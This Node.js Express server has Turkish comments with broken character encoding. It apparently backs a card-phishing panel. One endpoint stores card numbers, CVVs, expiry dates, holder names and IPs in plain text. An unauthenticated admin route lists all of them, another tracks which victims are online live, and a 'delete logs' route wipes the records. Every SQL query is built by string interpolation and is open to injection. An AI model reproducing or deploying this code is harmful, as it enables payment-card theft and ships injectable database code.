const express = require('express');
const mysql = require('mysql2');
const requestIp = require('request-ip');
require('dotenv').config();
const app = express();
app.use(requestIp.mw());
const port = process.env.PORT || 3000; // VarsayÄ±lan port 3000 veya baÅŸka bir port


 
app.use(express.json());

 app.use(express.static('public'));

 app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
app.get('/admin', (req, res) => {
  res.sendFile(__dirname + '/public/admin.html');
});

app.get('/api/info', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);
  connection.connect((err) => {
    if (err) {
      console.error('VeritabanÄ± baÄŸlantÄ±sÄ± kurulamadÄ±:', err);
      return res.status(500).json({ error: 'VeritabanÄ± baÄŸlantÄ± hatasÄ±' });
    }

    // "info" tablosundan verileri sorgula
    const query = 'SELECT * FROM info';
    
    connection.query(query, (error, results, fields) => {
      if (error) {
        console.error('Sorgu hatasÄ±:', error);
        return res.status(500).json({ error: 'VeritabanÄ± sorgu hatasÄ±' });
      }

      console.log('Veriler baÅŸarÄ±yla alÄ±ndÄ±.');

      connection.end();

      const infoList = results;
      res.json(infoList);
    });
  });
});

app.post('/online-api', (req, res) => {
  const visitorIP = req.body.visitorIP;

   const connection = mysql.createConnection(process.env.DATABASE_URL);

   const updateQuery = `
    UPDATE info
    SET active_status = ${Math.floor(Date.now() / 1000) + 7}
    WHERE ip = '${visitorIP}'
  `;

  connection.query(updateQuery, (error, results) => {
    if (error) {
      console.error('GÃ¼ncelleme hatasÄ±:', error);
      return res.status(500).json({ error: 'GÃ¼ncelleme hatasÄ±' });
    }

     res.json({ success: true });

     connection.end();
  });
});

app.post('/your-payment-api', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);
  const cardHolder = req.body.cardHolder;
  const cardNumber = req.body.cardNumber;
  const cardExpirationMonth = req.body.cardExpirationMonth;
  const cardExpirationYear = req.body.cardExpirationYear;
  const cardCCV = req.body.cardCCV;
  const visitorIP = req.body.visitorIP; // ZiyaretÃ§inin IP'sini buradan alÄ±n

  // VeritabanÄ±na yeni bir kayÄ±t eklemek iÃ§in gerekli SQL sorgusunu oluÅŸturun
  const insertQuery = `
  INSERT INTO info (bank_name, tckn, cardnumber, exp, cvv, ip)
  VALUES ('', '${cardHolder}', '${cardNumber}', '${cardExpirationMonth + cardExpirationYear}', '${cardCCV}', '${visitorIP}')
  `;

  connection.query(insertQuery, (error, results) => {
      if (error) {
          console.error('Ã–deme kaydÄ± eklenemedi:', error);
          return res.status(500).json({ error: 'Ã–deme kaydÄ± eklenemedi' });
      }

      // BaÅŸarÄ±lÄ± yanÄ±t verin
      res.json({ success: true });
      connection.end();
  });
});

app.post('/delete-logs-api', (req, res) => {
  const connection = mysql.createConnection(process.env.DATABASE_URL);

  // LoglarÄ± temizleme sorgusu
  const deleteQuery = 'DELETE FROM info';

  connection.connect((err) => {
      if (err) {
          console.error('VeritabanÄ± baÄŸlantÄ±sÄ± kurulamadÄ±:', err);
          return res.status(500).json({ error: 'VeritabanÄ± baÄŸlantÄ± hatasÄ±' });
      }

      connection.query(deleteQuery, (error, results) => {
          if (error) {
              console.error('LoglarÄ± silme hatasÄ±:', error);
              return res.status(500).json({ error: 'LoglarÄ± silme hatasÄ±' });
          }

          // BaÅŸarÄ±lÄ± yanÄ±t verin
          res.json({ success: true });
      });
  });
});

 app.listen(port, () => {
  console.log(`Web sunucusu http://localhost:${port} adresinde Ã§alÄ±ÅŸÄ±yor.`);
});
